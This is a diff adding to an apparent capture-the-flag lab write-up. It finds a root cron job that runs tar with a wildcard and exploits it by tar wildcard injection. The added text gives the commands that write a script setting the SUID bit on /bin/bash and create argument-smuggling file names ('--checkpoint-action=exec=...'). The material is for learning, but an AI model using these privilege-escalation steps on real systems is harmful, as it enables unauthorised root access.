@@ -435,3 +435,44 @@ We can now run it with
 ```
 ## Running Linpeas.sh 
 ![[Pasted image 20251022201118.png]]
+
+## Interesting finds
+```bash
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+```
+
+This seems to be a cronjob that can be executed by root
+Lets explore this further navigating to the location
+```bash
+$ ls                                                                                                                
+backup.sh                                                                                                           
+backup.tgz                                                                                                          
+$ cat backup.sh                                                                                                     
+#!/bin/bash                                                                                                         
+cd /var/www/html                                                                                                    
+tar cf /home/milesdyson/backups/backup.tgz * 
+```
+
+I had to lookup some guidance for this, but basically we have to perform something called wildcard injection, which exploit the wildcard in the tar command, to do so we need to do the following: 
+In order to successfully exploit this vulnerability, we’re going to proceed as follows :
+
+1. Create a script to set the SUID bit to /bin/bash.
+
+```
+echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/root_shell.sh
+```
+
+2. Create these two files --checkpoint-action=exec=sh root_shell.sh and --checkpoint=1 . Here’s how to do that :
+
+touch "/var/www/html/--checkpoint-action=exec=sh root_shell.sh"
+
+touch "/var/www/html/--checkpoint=1"
+
